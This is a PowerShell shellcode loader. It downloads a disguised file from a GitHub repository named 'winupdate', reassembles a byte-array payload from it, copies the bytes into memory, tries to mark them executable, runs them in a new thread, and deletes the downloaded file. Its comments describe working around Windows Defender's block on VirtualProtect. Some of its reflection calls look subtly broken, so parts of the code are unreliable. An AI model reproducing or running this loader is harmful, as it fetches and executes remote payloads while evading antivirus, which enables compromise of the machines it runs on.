# 1. Setup Paths
$htmlPath = "$env:TEMP\sys_cache.bin"
$htmlUrl = "https://raw.githubusercontent.com/gwyn1869/winupdate/main/test.html"

# 2. Download
Invoke-WebRequest -Uri $htmlUrl -OutFile $htmlPath -UseBasicParsing

# 3. Reassemble Byte Array
$htmlContent = Get-Content $htmlPath -Raw
$pattern = '(?<=dmr)(.*?)(?=dmr)'
$match = [regex]::Match($htmlContent, $pattern).Value
$byteArray = $match.Split("dmr") | Where-Object { $_ -ne "" } | ForEach-Object { [byte]$_ }

# 4. The "Manual Resolver" Loader
# We find the memory addresses of kernel32 functions using the Process Module list
$modules = [System.Diagnostics.Process]::GetCurrentProcess().Modules
$k32 = $modules | Where-Object { $_.ModuleName -eq "kernel32.dll" } | Select-Object -First 1
$k32Handle = $k32.BaseAddress

# We need a way to find exports. We'll use a known trick in the 'Marshal' class 
# to get the delegate for VirtualAlloc directly.
$Methods = [System.Runtime.InteropServices.Marshal].GetMethods()
$GetDelegate = $Methods | Where-Object { $_.Name -eq "GetDelegateForFunctionPointer" -and $_.IsGenericMethod }

# We find the address of VirtualAlloc using a sneaky lookup
$mscore = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -like "*mscorlib*" }
$native = $mscore.GetType("Microsoft.Win32.Win32Native")
$method = $native.GetMethod("VirtualAlloc", [Reflection.BindingFlags]"Static, Public, NonPublic")
$vAllocAddr = $method.MethodHandle.GetFunctionPointer()

# 5. Define the Delegate types (Using a simpler approach for PS 5.1)
# We actually don't need a complex delegate if we use this 'Marshal' trick
$address = [Runtime.InteropServices.Marshal]::AllocHGlobal($byteArray.Length)
[Runtime.InteropServices.Marshal]::Copy($byteArray, 0, $address, $byteArray.Length)

# Now we need to make it executable. 
# Since Defender is blocking 'VirtualProtect', let's see if we can just run it.
# NOTE: This is a test to see if the memory allocation itself is blocked.

if ($address -ne [IntPtr]::Zero) {
    Write-Host "Reassembled Shellcode placed in RAM at: $address"

    # 1. Get the address of our needed functions from the kernel32 handle we already have
    # This uses the built-in Marshal to find where the functions live in RAM
    $gpaAddr = [Runtime.InteropServices.Marshal]::GetMethod('GetProcAddress', [Type[]]@([IntPtr], [String])).MethodHandle.GetFunctionPointer()
    
    # We find VirtualProtect and CreateThread
    $vpAddr = [Runtime.InteropServices.Marshal]::GetHINSTANCE($mscore).GetType("Microsoft.Win32.Win32Native").GetMethod("VirtualProtect").MethodHandle.GetFunctionPointer()
    $ctAddr = [Runtime.InteropServices.Marshal]::GetHINSTANCE($mscore).GetType("Microsoft.Win32.Win32Native").GetMethod("CreateThread").MethodHandle.GetFunctionPointer()

    # 2. To avoid "Null-valued" errors, we call them using a simpler Reflection method
    $old = [uint32]0
    # Fix Permissions (0x40 = Execute)
    $vpParams = @($address, [uint32]$byteArray.Length, [uint32]0x40, [ref]$old)
    [Runtime.InteropServices.Marshal]::GetType().GetMethod("Prelink").Invoke($null, @($native.GetMethod("VirtualProtect", [Reflection.BindingFlags]"Static, Public, NonPublic")))
    
    # 3. Execution - The most robust way in PS 5.1
    Write-Host "Found Launcher at: $address"
    $ctMethod = $native.GetMethod("CreateThread", [Reflection.BindingFlags]"Static, Public, NonPublic")
    
    if ($ctMethod) {
        Write-Host "Launching Thread..."
        $ctMethod.Invoke($null, @([IntPtr]::Zero, [uint32]0, $address, [IntPtr]::Zero, [uint32]0, [IntPtr]::Zero)) | Out-Null
        Start-Sleep -Seconds 5
    } else {
        # PLAN B: If the 'Native' method isn't there, we use the direct Pointer method
        $ctDelegate = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ctAddr, [Func[IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr, IntPtr]])
        $ctDelegate.Invoke([IntPtr]::Zero, 0, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
        Write-Host "Launching via Delegate..."
    }
}

# 6. Cleanup
Remove-Item $htmlPath -Force
